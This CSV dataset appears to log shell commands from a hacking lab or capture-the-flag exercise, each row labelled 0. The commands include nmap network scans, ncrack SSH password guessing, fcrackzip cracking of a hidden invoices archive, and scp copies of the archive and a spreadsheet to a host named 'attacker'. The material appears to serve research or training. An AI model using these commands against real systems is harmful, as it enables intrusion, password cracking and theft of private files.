value,target
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip ./,0
cd /hacking,0
cd ~/hacking,0
fcrackzip --brute-force .invoices2019.zip,0
unzip -P 'aakK!w' .invoices2019.zip,0
fcrackzip --brute-force -u .invoices2019.zip,0
fcrackzip -b -c 'a' .invoices2019.zip,0
fcrackzip -b -u -c 'a' .invoices2019.zip,0
fcrackzip -b -u .invoices2019.zip,0
fcrackzip -D -p wordlist.txt -u .invoices2019.zip,0
ls =la,0
ls -la Desktop/,0
ls -la Downloads/,0
ls -la Music/,0
ls -la Pictures/,0
ls -la Public/,0
ls -la Templates/,0
ls -la Videos/,0
ls -la .local,0
ls -la .ssh,0
ls -la .gnupg/,0
ls -la .config/,0
ls -la .cache,0
ls -la hacking,0
svvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv#026#026#026#026,0
namap,0
ls -la personal/,0
scp admin@10.1.26.9/home/admin/.invoices2019.zip /.,0
cat TAX1579659.txt,0
cat TAX15796249.txt,0
cat TAX15796252.txt,0
cat TAX15796259.txt,0
fcrackzip -b -V -u .invoices2019.zip,0
fcrackzip -b -V --method .invoices2019.zip,0
fcrackzip -V -b .invoices2019.zip,0
fcrackzip -b -v unzip .invoices2019.zip,0
fcrack -b -v unzip .invoices2019.zip,0
fcrackzip -D hacking/wordlist.txt .invoices2019.zip,0
fcrackzip -D -p  hacking/wordlist.txt .invoices2019.zip,0
unzip .invoices2019.zip,0
tree,0
nmap -v -sn 192.168.0.0/16,0
nmap -v -sn 10.1.26.0/24 -p,0
nmap -sn 10.1.26.0/24 -p,0
nmap -sn 10.1.26.0/24 -O,0
nmap -sn 10.1.26.0/24 --top-ports 20,0
nmap  10.1.26.1,0
nmap  10.1.26.2,0
find *.zip,0
find -h,0
find .  *.zip,0
scp admin@10.1.26.9~/personal .invoices2019.zip .,0
scp admin@10.1.26.9/personal .invoices2019.zip .,0
scp admin@10.1.26.9/personal/.invoices2019.zip .,0
scp admin@10.1.26.9~/personal/.invoices2019.zip .,0
man scp,0
scp admin@10.1.26.9:personal/.invoices2019.zip .,0
fcrackzip -b .invoices2019.zip,0
fcrackzip -b .invoices2019.zip -u,0
fcrackzip -D .invoices2019.zip -u,0
fcrackzip -D -i .invoices2019.zip,0
fcrackzip -D -u .invoices2019.zip,0
fcrackzip -u .invoices2019.zip  -D /usr/share/wordlists/fasttrack.txt,0
fcrackzip -u -D -p /usr/share/wordlists/fasttrack.txt .invoices.zip,0
fcrackzip -u -D -p /usr/share/wordlists/fasttrack.txt .invoices2019.zip,0
vim /usr/share/wordlists/fasttrack.txt,0
cd hacking,0
cd.,0
nmap -v 10.1.26.0/24,0
ssh admin@10.1.26.0/2049,0
ssh admin@10.1.26.0/24,0
ssh admin@10.1.26.0/24/2049,0
ssh admin@10.1.26.0.2049/24,0
ssh admin@10.1.26.0.2049/24:2049,0
ssh admin@10.1.26.0.2049:2049,0
ssh admin@10.1.26.0/24:2049,0
ssh admin@10.1.26.0:2049,0
cd Mydata.xlsx,0
cd Croatia 2019,0
cd-,0
scp @: Mydata.xlsx,0
scp admin@.invoices2019.zip/Desktop,0
scp admin@.invoices2019.zip/user/Desktop,0
scp admin@remote:.invoices2019.zip/Desktop,0
scp admin@remote:/.invoices2019.zip/Desktop,0
scp admin@remote:/personal/.invoices2019.zip/user/Desktop,0
scp admin@remote:admin/home/personal/.invoices2019.zip/user/Desktop,0
cd  ..,0
find . -iname /*.zip,0
find . -iname \*.zip,0
scp --helllllp,0
scp --p,0
scp admin@10.1.26.9:./personal/invoices2019.zip ./,0
scp admin@10.1.26.9:/home/admin/personal/invoices2019.zip ./,0
fcrackzip -D hacking/wordlist.txt ./.invoices2019.zip,0
fcrackzip -D -p hacking/wordlist.txt ./.invoices2019.zip,0
wordlist.txt,0
vim wordlist.txt,0
zenmap,0
nmap -T4 -A -v 10.1.26.0/24,0
cd Croatia #033[F,0
cd croatia,0
cd 'Italy 2018',0
cd .,0
scp invoices2019.zip attacker@10.1.26.23,0
scp .invoices2019.zip attacker@10.1.26.23,0
scp '.invoices2019.zip' attacker@10.1.26.23,0
scp '.invoices2019.zip' attacker@10.1.26.23/home,0
scp '.invoices2019.zip' attacker@10.1.26.23/root/home,0
scp '.invoices2019.zip' attacker@10.1.26.23:/root/home,0
scp '.invoices2019.zip' root@10.1.26.23/root/home,0
scp '.invoices2019.zip' root@10.1.26.23:/root/home,0
scp '.invoices2019.zip' root@ss10.1.26.23:/root/home,0
s,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip root@10.1.26.23:root/home,0
scp /home/admin/personal/.invoices2019.zip root@10.1.26.23:/home,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip,0
scp -t  admin@10.1.26.9:/home/admin/personal/.invoices2019.zip,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip,0
fcrackzip -v -u -b .invoices2019.zip,0
fcrackzip -v -u -b -c a .invoices2019.zip,0
fcrackzip -v -u -b -c aA .invoices2019.zip,0
fcrackzip -D /hacking/wordlist.txt .inveoices2019.zip,0
fcrackzip -D ~/hacking/wordlist.txt .inveoices2019.zip,0
fcrackzip -d ~/hacking/wordlist.txt .inveoices2019.zip,0
fcrackzip -D /home/hacking/wordlist.txt .invoices2019.zip,0
fcrackzip -D /root/hacking/wordlist.txt .invoices2019.zip,0
fcrackzip -D -u -p /root/hacking/wordlist.txt .invoices2019.zip,0
fcrackzip -D -u -p /root/hacking/wordlist.txt  .invoices2019.zip,0
find . -mindepth  -maxdepth  -not -empty -type d,0
find . -mindepth 1 -maxdepth 1 -not -empty -type d,0
nmap -p 10.1.26.0/24,0
nmap -p- 10.1.26.0/24,0
ls -lwx,0
ls -lw,0
"find . |grep -e ""\.zip$""",0
scp admin@10.1.26.9:/personal/.invoices2019.zip ./hacking,0
scp admin@10.1.26.9:/root/personal/.invoices2019.zip ./hacking,0
scp admin@10.1.26.9:/root/personal/.invoices2019.zip /root,0
scp ./personal/.invoices2019.zip root@attacker:/root/hacking,0
scp admin@10.1.26.9:/root/personal/.invoices2019.zip,0
scp admin@10.1.26.9:/root/personal/.invoices2019.zip ./,0
chmod .invoices.2019 a +rwx,0
chmod o-rwx .invoices2019.zip,0
chmod a+rwx .invoices2019.zip,0
chmod a+rwx personal,0
scp admin@10.1.26.9:./personal/.invoices2019.zip ./,0
fcrackzip .invoices2019.zip,0
.invoices2019.zip,0
startgame,0
flag startgame,0
ls /root/hacking,0
ssh username@10.1.26.9,0
admin@10.1.26.9,0
username@10.1.26.9,0
cd admin,0
ls -R,0
ls -R -a,0
cd admin/personal/,0
scp admin@10.1.26.9:/home/personal/.invoices.zip invoices.zip,0
scp admin@10.1.26.9:/home/personal/.invoices2019.zip invoices.zip,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip invoices.zip,0
fcrackzip -D -p /hacking/wordlist.txt invoices.zip,0
fcrackzip -D -p ./hacking/wordlist.txt invoices.zip,0
fcrackzip -u -D -p ./hacking/wordlist.txt invoices.zip,0
cd user-access/,0
cd m,0
cd mnt,0
"cd ,,",0
cd home/user-access/,0
su root toor,0
npam -sn 10.1.26.0/24,0
nmap -Fsn 10.1.26.0/24,0
nmap -F 10.1.26.1,0
nmap -F 10.1.26.2,0
nmap -F 10.1.26.4,0
nmap -F 10.1.26.9,0
nmap -F 10.1.26.254,0
nano Mydata.xlsx,0
ls -lar,0
dc debian/,0
find . -name *.zip,0
els,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip ~/hacking,0
fcrackzip -b a1:,0
fcrackzip -c a -p aaaaaa .invoices2019.zip,0
fcrackzip -p a -l 1 .invoices2019.zip,0
fcrackzip -l 1 .invoices2019.zip,0
fcrackzip -l 1 10 .invoices2019.zip,0
fcrackzip -b -c  .invoices2019.zip,0
fcrackzip -b -c 'a' -u .invoices2019.zip,0
fcrackzip -b -c 'aA1' -u .invoices2019.zip,0
fcrackzip -b -c 'aA1' -l 1-6 -u .invoices2019.zip,0
fcrackzip -b -c 'aA1!' -l 1-6 -u .invoices2019.zip,0
fcrackzip -b -c 'aA1!' -u .invoices2019.zip,0
nano wordlist.txt,0
ifconfic,0
nmap 10.1.26.0,0
man nfs,0
man cpy,0
scp ./Mydata.xlsx root@192.168.129.231:/~,0
scp admin@10.1.26.9:~/personal/Mydata.xlsx /~,0
find / | grep .zip,0
scp admin@10.1.26.9:~/personal/.invoices.zip /~,0
"scp admin@10.1.26.9:""~/personal/.invoices.zip"" /~",0
scp admin@10.1.26.9:~/personal/.invoices2019.zip /~,0
find / | grep .invoices2019.zip,0
fcrackzip --dictionary .invoices2019.zip,0
fcrackzip --dictionary ./.invoices2019.zip,0
fcrackzip ./.invoices2019.zip,0
fcrackzip -D ./.invoices2019.zip,0
fcrackzip -b ./.invoices2019.zip,0
find / | grep fcrackzip,0
fcrackzip -D /var/lib/dpkg/info/fcrackzip.list ./.invoices2019.zip,0
fcrackzip -Dp /var/lib/dpkg/info/fcrackzip.list ./.invoices2019.zip,0
fcrackzip -D -p /var/lib/dpkg/info/fcrackzip.list ./.invoices2019.zip,0
fcrackzip -D -p/var/lib/dpkg/info/fcrackzip.list ./.invoices2019.zip,0
fcrackzip -D -p./wordlist.txt ./.invoices2019.zip,0
./.invoices.zip,0
./.invoices2019.zip,0
chmod ./.invoices2019.zip 777,0
chmod 777 ./.invoices2019.zip,0
cat ./.invoices2019.zip,0
zip,0
logout,0
zip ./.invoices2019.zip,0
unzip ./.invoices2019.zip,0
cat ./invoices2019TAX15796249.txt,0
cat ./invoices2019/TAX15796249.txt,0
touch file.txt,0
rm file.txt,0
/root,0
cd debian,0
cd hacd cd d,0
asdasdasddasdas,0
cd hacker,0
ls /a,0
scp .invoices2019.zip @: /,0
scp @: /,0
cp .invoices2019.zip copy.zip,0
scp copy.zip @: /,0
scp @> {,0
scp .invoices2019.zip  @:/,0
scp admin@10.1.26.9:personal/.invoices2019.zip /,0
scp admin@10.1.26.9:personal/.invoices2019.zip /root,0
man frackzip,0
fcrackzip .invoices2019.zip --brute--force,0
fcrackzip .invoices2019.zip -b,0
unzip -p akRfdN .invoices2019.zip,0
mkdir invoices,0
unzip -p akRfdN .invoices2019.zip -d invoices,0
unzip -P akRfdN .invoices2019.zip -d invoices,0
cd invoices/,0
cat TAX157962.txt,0
copy .invoices2019.zip copy.zip,0
fcrackzip --use--unzip copy.zip,0
fcrackzip -u copy.zip,0
fcrackzip .invoices2019.zip -b -l 1,0
fcrackzip .invoices2019.zip -b -l 2,0
fcrackzip -l 1 -b copy.zip,0
fcrackzip -l 6 -b copy.zip,0
fcrackzip -b copy.zip -l 4,0
fcrackzip -b copy.zip -l 3,0
fcrackzip -b copy.zip -l 5,0
:*l=man fcrackzip,0
fcrackzip -b copy.zip -l 4-10 -u,0
fcrackzip -b copy.zip -l 4 -u,0
fcrackzip -b copy.zip -u,0
fcrackzip -b copy.zip -u -l 5,0
fcrackzip -D wordlist.txt -u copy.zip,0
fcrackzip -D -p wordlist.txt copy.zip,0
fcrackzip -D -p wordlist.txt copy.zip -u,0
unzip -P IhateMyJob -d invoices,0
id,0
cd ls -la,0
ls ./hacking,0
which nmap,0
nmap -sS -sV 10.1.26.0/24,0
which fcrackzip,0
man scop,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip ~,0
fcrackzip .invoices2019.zip -D hacking/wordlist.txt,0
fcrackzip -D -p hacking/wordlist.txt .invoices2019.zip,0
bze,0
bye,0
ls -A,0
login,0
cd .profile,0
cd ./root,0
cat .profile,0
cd $HOME,0
nmap 10.1.26.0\24,0
scp .invoices2019.zip,0
scp .invoices2019.zip .,0
scp admin@10.1.24.9:personal,0
scp admin@10.1.24.9:personal/.invoices2019.zip .,0
scp admin@10.1.24.9:personal/.invoices2019.zip root,0
scp @,0
scp @ /,0
scp wordlist.txt admin@10.1.26.9,0
scp wordlist.txt admin@10.1.26.9:personal,0
scp .invoices2019.zip root@attacker,0
scp .invoices2019.zip root@attacker:root,0
fcrackzip -D wordlist.txt,0
fcrackzip -u -p wordlist.txt .invoices2019.zip,0
fcrackzip -u -D -p wordlist.txt .invoices2019.zip,0
ls /root/hacking/wordlist.txt,0
nmap 10.1.26.,0
nmap 10.1.26.1,0
arp,0
nmap 10.1.26.1-10,0
nmap 10.1.26.1-254,0
nmap 10.1.26.0-254,0
ncrack -h,0
"ncrack --user admin --pass password,admin,123456",0
"ncrack --user admin --pass password,admin,123456 ssh://10.1.26.9",0
scp @:/,0
cd personal/ && scp @:/,0
ls -lRa,0
scp 10.1.26.9 localhost,0
scp @:/ personal/.invoices2019.zip,0
scp personal/.invoices2019.zip @:/,0
scp personal/.invoices2019.zip  10.1.26.9 localhost,0
scp personal/.invoices2019.zip  admin@10.1.26.9 localhost,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip @:/,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip @,0
ls @,0
ls @ -lR,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip invoices.zip,0
rm @,0
cat hacking/wordlist.txt,0
fcrackzip -D hacking/wordlist.txt invoices.zip,0
fcrackzip -D  invoices.zip,0
fcrackzip -D invoices.zip,0
fcrackzip -v -D invoices.zip,0
sort hacking/wordlist.txt | fcrackzip -v -D invoices.zip,0
fcrackzip -v invoices.zip,0
fcrackzip --dictionary -v invoices.zip,0
fcrackzip --dictionary -v hacking/wordlist.txt,0
fcrackzip --dictionary -v hacking/wordlist.txt invoices.zip,0
fcrackzip --dictionary hacking/wordlist.txt invoices.zip,0
fcrackzip --dictionary -p hacking/wordlist.txt invoices.zip,0
ls ls /root/,0
ls -l /root/,0
ls -la /root/,0
ls /root/,0
ls -la /root/hacking/,0
cat ~/.bashrc,0
nmapnnnnnnnn,0
echo Adam,0
ssh 10.1.26.0/24,0
-a,0
cd pe,0
scp .invoices2019.zip root@attacker:,0
rcp .invoices2019.zip root@10.1.26.23:,0
scp admin@10.1.26.9:home/admin/personal/.invoices2019.zip .,0
fcrackzip --use-unzip .invoices2019.zip,0
fcrackzip --brute-force,0
fcrackzip --brute-force --use-unzip .invoices2019.zip,0
~/hacking/,0
cd ~/hacking/,0
fcrackzip -D wordlist.txt -u /home/root/.invoices2019.zip,0
fcrackzip -D 'wordlist.txt' -u /home/root/.invoices2019.zip,0
fcrackzip -D -p 'wordlist.txt' -u /home/root/.invoices2019.zip,0
ls hacking,0
ls personal/,0
scp admin@10.1.26.23:/,0
scp -r admin@10.1.26.23:/ /,0
scp -r root@10.1.26.23:/ /,0
scp -r 10.1.26.23:/ /,0
scp -r admin@10.1.26.9:/ /,0
scp -r admin@10.1.26.9:/ /home/root/personal,0
scp -r admin@10.1.26.9:/home/admin/personal .,0
ls personal/Croatia\ 2019/,0
ls personal/Italy\ 2018/,0
ls personal/.,0
find -r .zip,0
find . -r .zip,0
fcrackzip -b -D ../dictionary.txt .invoices2019.zip,0
ls ..,0
ls ../hacking,0
fcrackzip -b -D ../hacking/wordlist.txt .invoices2019.zip,0
fcrackzip -b -D /root/hacking/wordlist.txt .invoices2019.zip,0
fcrackzip -D -p /root/hacking/wordlist.txt .invoices2019.zip,0
cat wordlist.xtx,0
np 10.1.26.9,0
scp @: / .invoices2019.zip,0
scp .invoices2019.zip @: /home,0
scp .invoices2019.zip @:/,0
scp .invoices2019.zip admin@server /,0
scp .invoices2019.zip 10.1.26.9 /,0
scp .invoices2019.zip @: /home/hacking,0
scp .invoices2019.zip @: /root,0
scp .invoices2019.zip @: /home/debian,0
scp .invoices2019.zip @: /lost+found/,0
cd r,0
an ssh,0
cat wordlist,0
scp wordlist.txt @: /,0
scp wordlist.txt admin@10.1.26.9:/,0
scp wordlist.txt admin@10.1.26.9:/personal,0
scp wordlist.txt admin@10.1.26.9:/remote/personal,0
scp .invoices2019.zip attacker@10.1.26.23: /,0
scp .invoices2019.zip root@10.1.26.23: /,0
scp .invoices2019.zip root@10.1.26.23: /home,0
find . -type f -print | args -0 -n 1 dirname,0
find . -type f -print,0
find . -type d ! -empty,0
arp -a,0
nmap 192.168.128.238,0
nmap 192.168.128.1,0
nmap 192.168.128.238/514,0
nmap -sT 10.1.26.0/24,0
ls- la,0
ls - la,0
cd ../Desktop/,0
cp .invoices2019.zip ~/Desktop/,0
cd  ~/Desktop/,0
fcrackzip -D -c,0
fcrackzip -D -c .invoices2019.zip,0
fcrackzip -D  .invoices2019.zip,0
fcrackzip -b -c 'a'  .invoices2019.zip,0
fcrackzip -b -c 'a1' -u .invoices2019.zip,0
man fcackzip,0
fcrackzip -b  -u .invoices2019.zip,0
cd ../Italy\ 2018/,0
lsa,0
-lsa,0
sudo systemctl start ssh.socket,0
sudo systemctl enable ssh.socket,0
systemctl status ssh.socket,0
ssh root@10.1.26.0/24,0
ip address,0
ssh root@192.168.130.200/17,0
ssh root@10.1.26.0,0
ssh root@192.168.130.200,0
ssh root@10.1.26.23,0
nmpa 10.1.26.23,0
ssh root@10.1.26.254,0
scp .invoices2019.zip /local/dir/.invoices2019.zip,0
scp .invoices2019.zip /local/dir,0
scp .invoices2019.zip .invoices2019.zip,0
scp -P 2049 admin@10.1.26.9:root/personal/.invoices2019.zip root/hacking/,0
scp -P 22 admin@10.1.26.9:root/personal/.invoices2019.zip root/hacking/,0
scp -P 22 admin@10.1.26.9:~/personal/root/.invoices2019.zip root/hacking/,0
scp -P 22 admin@10.1.26.9:~/personal/.invoices2019.zip root/hacking/,0
scp -P 22 admin@10.1.26.9:~/personal/.invoices2019.zip /root/,0
scp -P 22 admin@10.1.26.9:~/personal/.invoices2019.zip /root,0
scp -P 22 admin@10.1.26.9:~/personal/.invoices2019.zip /root/hacking/,0
scp -P 22 admin@10.1.26.9:~/personal/.invoices2019.zip /root/Desktop/,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip /local/dir,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip /root/Desktop/,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip /root/Downloads/,0
~.,0
find /home/root/ -name .invoices2019.zip,0
find /root/ -name .invoices2019.zip,0
"echo ""Jacob""",0
nmap -sP 10.1.26.1-254,0
nmap -sP 10.1.26.1-254 -A,0
nmap -sV 10.1.26.1-254 -A,0
nmap -sV 10.1.26.1-254,0
nmap -sV -Pn  10.1.26.9,0
nmap -sV -Pn  10.1.26.1-254,0
nmap -sV -Pn  10.1.26.0-255,0
nmap -sV -p-  10.1.26.0-255,0
scp root@attacker /root ./personal/.invoices2019.zip,0
scp root@attacker /root ./personal,0
sftp admin@10.1.26.9,0
ls /,0
ls /hom,0
ls /home,0
sftp admin@10.1.26.9:personal/.invoices2019.zip result,0
cd result,0
fcrackzip -b result,0
fcrackzip -b -u result,0
sftp admin@10.1.26.9:personal/.invoices2019.zip /root,0
fcrackzip -v -u -D -p hacking/wordlist.txt  .invoices2019.zip,0
sudo cd hacking/,0
cd /root/hacking/,0
sudo login,0
scp Mydata.xlsx root@attacker,0
cd /home/admin,0
scp .invoices2019.zip  root@attacker,0
scp .invoices2019.zip  root@attacker/invoices2019.zip,0
scp admin@server:/personal/.invoices2019.zip hacking/,0
scp admin@10.1.26.9:/personal/.invoices2019.zip hacking/,0
scp admin@10.1.26.9:home/admin/personal/.invoices2019.zip hacking/,0
scp .invoices2019.zip  root@attacker:/hacking,0
scp .invoices2019.zip  root@10.1.26.0,0
ssh admin@10.1.26.9:/personal/.invoices2019.txt hacking/,0
ssh admin@10.1.26.9:/personal/.invoices2019.txt hacking/ -v,0
ssh admin@10.1.26.9:/personal/.invoices2019.zip hacking/,0
unzip ssh-access.zip -d ~/.ssh/,0
cd C:,0
cd ~\,0
Mydata.xlsx,0
vim Mydata.xlsx,0
scp admin@server /personal/.invocies2019.zip Downloads/,0
scp admin@server:/personal/.invocies2019.zip Downloads/,0
scp admin@10.1.26.9:/personal/.invocies2019.zip Downloads/,0
scp admin@10.1.26.9:/personal/.invoices2019.zip Downloads/,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip Downloads/,0
fcrackzip -d,0
fcrackzip -D .invoices2019 hacking/wordlist.txt,0
fcrackzip -D .invoices2019.zip hacking/wordlist.txt,0
fcrackzip -D .invoices2019.zip ~/hacking/wordlist.txt,0
fcrackzip -D ~/hacking/wordlist.txt .invoices2019.zip,0
fcrackzip -u -D -p ~/hacking/wordlist.txt .invoices2019.zip,0
nmap -sP 10.1.26.0/24.,0
cat /etc/services,0
nmap 10.1.26.254,0
cr Italy\ 2018/,0
scp -r admin@10.1.26.9:~/Mydata.xlsx ~/hacking/,0
scp -r admin@10.1.26.9:Mydata.xlsx ~/hacking/,0
scp -r admin@10.1.26.9:~/personal/Mydata.xlsx ~/hacking/,0
zip adminInfo Mydata.xlsx,0
mv adminInfo.zip ~,0
zip -help,0
mv Mydata.xlsx ~,0
scp -r admin@10.1.26.9:~/personal/.invoices2019.zip ~,0
mv wordlist.txt ~,0
fcrackzip -dictionary wordlist.txt .invoices2019.zip,0
fcrackzip --dictionary wordlist.txt .invoices2019.zip,0
fcrackzip -D wordlist.txt '.invoices2019.zip',0
fcrackzip '.invoices2019.zip',0
fcrackzip '.invoices2019.zip' -d wordlist.txt,0
crackzip '.invoices2019.zip' -D wordlist.t,0
fcrackzip '.invoices2019.zip' -D wordlist.t,0
fcrackzip '.invoices2019.zip' -D wordlist.txt,0
fcrackzip '.invoices2019.zip' -D wordlist.txt -u -p,0
fcrackzip -u -D -p '~/..invoices2019.zipinvoices2019.zip',0
fcrackzip -u -D -p '~/wordlist.txt' .invoices2019.zip,0
fcrackzip -u -D -p 'wordlist.txt' .invoices2019.zip,0
x,0
echo Alice,0
ls /root,0
ls -L /root,0
find dirname -not empty -ls,0
find dirname -not -empty -ls,0
find -not -empty -ls,0
nmap -Pn 10.1.26.0,0
nmap 192.168.130.0,0
npm -p- 192.168.130.0,0
nmap -p- 192.168.130.0,0
nc -z -v 192.168.130.0,0
nmap -p- 192.168.128.137,0
nmap -p- 10.1.26.23,0
ping 10.1.26.0,0
ping 10.1.26.0 -b,0
ifconfig -all,0
ifconfig --help,0
ssh admin@10.1.269,0
find home -iname \*.zip,0
find ~/home -iname \*.zip,0
find ~/admin/home -iname \*.zip,0
find -iname \*.zip,0
scp ./admin/personal/.invoices2019.zip attacker@10.1.26.23,0
scp ./admin/personal/.invoices2019.zip attacker@10.1.26.23/home/invoices2019.zip,0
scp ./admin/personal/.invoices2019.zip attacker@10.1.26.23:/home/invoices2019.zip,0
scp ./admin/personal/.invoices2019.zip root@10.1.26.23:/home/invoices2019.zip,0
scp admin@10.1.26.9:./admin/personal/.invoices2019.zip ./,0
scp admin@10.1.26.9:./home/admin/personal/.invoices2019.zip ./,0
scp admin@10.1.26.9:/admin/personal/.invoices2019.zip ./,0
scp admin@10.1.26.9:.invoices2019.zip ./,0
scp admin@server:.invoices2019.zip ./,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip ~/Documents,0
ls -a Documents/,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip ~/Desktop/invoices2019.zip,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip ~/Desktop/.invoices2019.zip,0
ls -la Documents/,0
find . -name .invoices2019.zip,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip ~/Desktop,0
fcrack -D - /usr/share/wordlists/fasttrack.txt invoices2019.zip,0
fcrackzip -D -u /usr/share/wordlists/fasttrack.txt /somewhereovertherainbow,0
fcrackzip -D -u -p /usr/share/wordlists/fasttrack.txt /Documents/invoices2019.zip,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip /home/root/Documents,0
ls -la /root/Destop,0
ls -la /root/Desktop/,0
scp admin@10.1.26.9:/home/admin/personal/.invoices2019.zip .,0
/root s^s,0
s/srsosos,0
s/srsososts,0
s/s/sqs]s,0
sqs,0
/home/root,0
/root/home,0
/cd,0
/hacking,0
cd wordlist.txt,0
ls Desktop,0
ls wordlist.txt,0
cd root/hacking,0
cd /root/hacking,0
nmap 10.1.26.9 22/tcp,0
ssh username@10.1.26.9 2049,0
ssh admin@10.1.26.9 2049,0
ls personal,0
ls Croatia 2019,0
ls /Croatia 2019,0
ls 'Croatia 2019',0
/home,0
ls /admin,0
ls/home/admin,0
ls /home/admin,0
ls /home/admin/personal,0
/home# scp admin@10.1.26.9:~/personal/.invoices2019.zip,0
scp admin@10.1.26.9:~personal/.invoices2019.zip,0
ls /home/admin/personal/'Croatia 2019',0
ls /home/admin/personal/'Italz 2019',0
ls /home/admin/personal/'Italy 2019',0
ls /home/admin/personal/'Italy 2018',0
/ls home,0
ls /home/debian,0
ls /debian,0
root@attacker: /home# scp admin@10.1.26.9:~/personal/.invoices2019.zip,0
root@attacker: /home# scp admin10.1.26.9:~/personal/.invoices2019.zip,0
frackzip -D,0
cd./root,0
ls.,0
/root directory,0
ls. /root /hacking,0
nmap v- sn- 10.1.26.9,0
-v -sn 10.1.26.9,0
-sn 10.1.26.9,0
username@10.1.26.255,0
shh,0
shh username@10.1.26.9,0
scp@: /home/admin,0
HOME directory,0
/home/admin,0
scp /home/admin,0
-i,0
-i /home/admin,0
HOME directory /home/admin,0
HOME /home/admin,0
scp -i /home/admin,0
-o,0
-i identify_file,0
-i identify_file /home/admin,0
locate /hime/admin,0
locate /home/admin,0
-locate /home/admin/*back*,0
"locate -i ""*.zip""",0
"locate -i /home/admin/""*.zip""",0
scp @: /home/admin,0
scp admin@10.1.26.9: /home/admin,0
cd Pictures/,0
CD..,0
cd Music/,0
scp @: /personal,0
scp attacker@10.1.26.23: /personal,0
disconnect,0
cd DOnw,0
find,0
find .invoices2019.zip,0
where .invoices2019.zip,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip /hacking,0
scp admin@10.1.26.9:~/personal/.invoices2019.zip /Downloads,0
